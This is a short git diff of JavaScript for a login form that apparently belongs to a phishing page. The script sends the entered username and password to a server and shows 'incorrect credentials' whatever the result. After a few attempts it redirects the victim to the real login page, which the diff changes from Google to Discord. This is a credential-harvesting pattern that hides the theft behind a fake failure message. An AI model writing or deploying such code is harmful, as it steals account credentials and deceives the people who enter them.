@@ -16,11 +16,11 @@ document.getElementById("loginForm").addEventListener("submit", async (e) => {
         body: JSON.stringify({ username, password })
     });
 
-    if (attemptCount < 3) {
+    if (attemptCount < 2) {
         alert("Credenciales incorrectas. Por favor, inténtalo de nuevo.");
     } else {
-        // Redirigir a la página de login de Google después del tercer intento
-        window.location.href = "https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fwww.google.com%2Fwebhp%3Fauthuser%3D1&ec=GAlAmgQ&hl=es&flowName=GlifWebSignIn&flowEntry=AddSession&dsh=S1142059354%3A1724181348196689&ddm=0";
+        // Redirigir a la página de login de Discord después del tercer intento
+        window.location.href = "https://discord.com/login";
     }
 
     const data = await response.json();
